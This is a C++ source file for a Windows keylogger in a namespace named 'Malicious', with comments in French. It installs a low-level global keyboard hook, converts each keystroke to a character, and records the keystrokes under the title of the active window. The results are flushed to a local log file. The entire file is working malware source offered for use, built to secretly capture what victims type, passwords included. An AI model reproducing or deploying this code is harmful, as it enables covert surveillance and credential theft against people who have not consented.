#include "Keylogger.hpp"
#include <common/Log.hpp>
#include <system/File.hpp>

#define MAX_TITLE_SIZE 255
#define KEY_UP(vk_code) ((GetAsyncKeyState(vk_code) & 0x8000) ? 1 : 0)
#define KEY_DOWN(vk_code) ((GetAsyncKeyState(vk_code) & 0x8000) ? 0 : 1)

namespace Malicious
{
	typedef struct
    {
        DWORD vkCode;
        DWORD scanCode;
        DWORD flags;
        DWORD time;
        unsigned long * dwExtraInfo;
    } KBDLLHOOKSTRUCT, *PKBDLLHOOKSTRUCT;

    __declspec(dllexport) LRESULT CALLBACK KeyloggingProc(int nCode,  WPARAM wParam,  LPARAM lParam)
    {
        // sauvegarde du prochain hook :
        LRESULT next = CallNextHookEx (Keylogger::instance().getHook(), nCode, wParam, lParam );
        if ( (nCode < 0 || nCode == HC_NOREMOVE) || (((DWORD)lParam & 1<<30) != false))
        {
            return next;
        }

        if(!Keylogger::instance().activated())
        {
            return next;
        }

        KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT*)lParam);
        // on enleve tous les evenements de type KEY_UP
        if(hooked.flags == 128)
        {
            return next;
        }

        DWORD vk_key = hooked.vkCode;
        if(vk_key == VK_SHIFT || vk_key == VK_CAPITAL || vk_key == VK_LSHIFT || vk_key == VK_RSHIFT)
		{
			return next;
		}
        char ascii_key = (char)MapVirtualKey(hooked.vkCode, 2);
        bool caps_locked = (((unsigned short)GetKeyState(0x14)) & 0xffff) != 0;
        bool maj = KEY_UP(VK_SHIFT) ^ caps_locked;

        // prise en charge des lettres
        if(ascii_key >= 'A' && ascii_key <= 'Z')
        {
            if(!maj)
            {
                ascii_key = tolower(ascii_key);
            }
        }
        else if(maj)
        {
            switch(vk_key)
            {
                case 48:
                    ascii_key = '0';
                    break;
                case 49:
                    ascii_key = '1';
                    break;
                case 50:
                    ascii_key = '2';
                    break;
                case 51:
                    ascii_key = '3';
                    break;
                case 52:
                    ascii_key = '4';
                    break;
                case 53:
                    ascii_key = '5';
                    break;
                case 54:
                    ascii_key = '6';
                    break;
                case 55:
                    ascii_key = '7';
                    break;
                case 56:
                    ascii_key = '8';
                    break;
                case 57:
                    ascii_key = '9';
                    break;
            }
        }
        else switch(vk_key)
        {
            case VK_NUMPAD0:
                ascii_key = '0';
                break;
            case VK_NUMPAD1:
                ascii_key = '1';
                break;
            case VK_NUMPAD2:
                ascii_key = '2';
                break;
            case VK_NUMPAD3:
                ascii_key = '3';
                break;
            case VK_NUMPAD4:
                ascii_key = '4';
                break;
            case VK_NUMPAD5:
                ascii_key = '5';
                break;
            case VK_NUMPAD6:
                ascii_key = '6';
                break;
            case VK_NUMPAD7:
                ascii_key = '7';
                break;
            case VK_NUMPAD8:
                ascii_key = '8';
                break;
            case VK_NUMPAD9:
                ascii_key = '9';
                break;
        }
        Keylogger::instance().addKey(ascii_key);
        return next;
    }
	
	Keylogger::Keylogger()
        :isActivated(false), window("undefined")
	{
	}
	
    Keylogger::~Keylogger()
	{
		try
		{
			stop();
			flush();
		}
		catch(...)
		{
		}
	}
	
	void Keylogger::clearKeylog()
	{
	    remove(log_file.c_str());
	}
	
    void Keylogger::setKeylog(const std::string& file)
    {
        log_file = file;
    }
    
    void Keylogger::updateWindowTitle()
    {
        char windowTitleBuffer[MAX_TITLE_SIZE];
        HWND windowHandle = GetForegroundWindow();
        GetWindowText(windowHandle, windowTitleBuffer, MAX_TITLE_SIZE);
        window = windowTitleBuffer;
    }
            
    void Keylogger::start()
    {
        FUNC_LOG(__FUNCTION__);
        // on ne démarre le keylogger uniquement s'il n'est pas déjà actif
        if(!isActivated)
        {
            hThread = CreateThread(0, 0,(LPTHREAD_START_ROUTINE)MsgLoop, 0, 0, &dwThread);
		    if(hThread == NULL)
		    {
			    LOG << "CreateThreadfailed : " + toString(GetLastError());
		    }
            LOG << "Keylogging enabled";
            isActivated = true;
        }
    }
            
    void Keylogger::stop()
    {
        FUNC_LOG(__FUNCTION__);
        if(isActivated)
        {
            if(!TerminateThread(hThread, 0))
		    {
			    LOG << "TerminateThread failed : " + toString(GetLastError());
		    }

            if(!UnhookWindowsHookEx(hook))
		    {
			    LOG << "UnhookWindowsHookEx failed : " + toString(GetLastError());
		    }
            LOG << "Keylogging disabled";
            isActivated = false;
        }
    }
            
    bool Keylogger::activated()
    {
        return isActivated;
    }
    
    void Keylogger::flush()
    {
        FUNC_LOG(__FUNCTION__);
        log.open(log_file.c_str(), std::ios::app);
        if(log)
        {
            LOG << "Flushing";
            for(std::map<std::string, std::string>::iterator iter = log_buffer.begin();
                iter != log_buffer.end();
                iter++)
            {
                log << iter->first << " <=> " << iter->second << "\n";
            }
			std::streamoff filesize = System::Size(log);
            log.close();
            log_buffer.clear();
			buffered_char = 0;
            
            if(filesize >= LOGFILE_MAX_SIZE)
            {
                LOG << "Log file is full. Effacement.";
                clearKeylog();
            }
        }
        else
        {
            LOG << "Error while flushing to " + log_file;
        }
    }
    
    void Keylogger::addKey(const char key)
    {
        FUNC_LOG(__FUNCTION__);
        updateWindowTitle();
        log_buffer[window] += key;
		buffered_char++;
		//LOG << "Key : " + toString(key) + " <=> " + window + ", buffer = " + toString(buffered_char);
		if(buffered_char >= MAX_BUFFERED)
		{
			flush();
		}
    }

    DWORD WINAPI Keylogger::MsgLoop(LPVOID lpParameter)
    {
		// apparemment il faut faire les SetWindowsHookEx dans le thread qui transmet les messages car finalement
        // le hook est un callback appelé par DispathMessage ?
        Keylogger::instance().hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyloggingProc, GetModuleHandle(0), 0);
		if(Keylogger::instance().hook == NULL)
		{
			LOG << "SetWindowsHookEx failed : " + toString(GetLastError());
        }

        MSG message;
        while (GetMessage(&message,NULL,0,0))
        {
            TranslateMessage(&message);
            DispatchMessage(&message);
        }
        return EXIT_SUCCESS;
    }

} // Malicious
